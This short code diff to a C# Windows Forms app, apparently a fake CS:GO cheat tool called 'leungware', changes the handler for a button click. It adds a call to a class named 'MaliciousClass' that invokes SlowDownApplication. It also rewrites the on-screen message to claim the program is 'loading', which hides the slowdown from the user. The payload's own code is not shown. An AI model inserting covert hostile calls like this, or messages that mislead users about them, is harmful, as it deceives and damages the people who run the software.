@@ -13,6 +13,7 @@ namespace leungware_v420
 {
     public partial class PLACEBO : Form
     {
+        public bool button2HasBeenClicked = false;
         public PLACEBO()
         {
             InitializeComponent();
@@ -33,14 +34,21 @@ namespace leungware_v420
 
         private void button2_Click(object sender, EventArgs e)
         {
+            
         }
 
         private void button2_Click_1(object sender, EventArgs e)
         {
+            button2HasBeenClicked = true;
             this.Hide();
-            MessageBox.Show("enjoy vac ban bro");
+            MessageBox.Show("enjoy vac ban bro - loading - might take a while...");
             var CSGO = new leungHOOK();
             CSGO.Show();
+            if (button2HasBeenClicked)
+            {
+                var inst = new MaliciousClass();
+                inst.SlowDownApplication(8);
+            }
         }
     }
 }
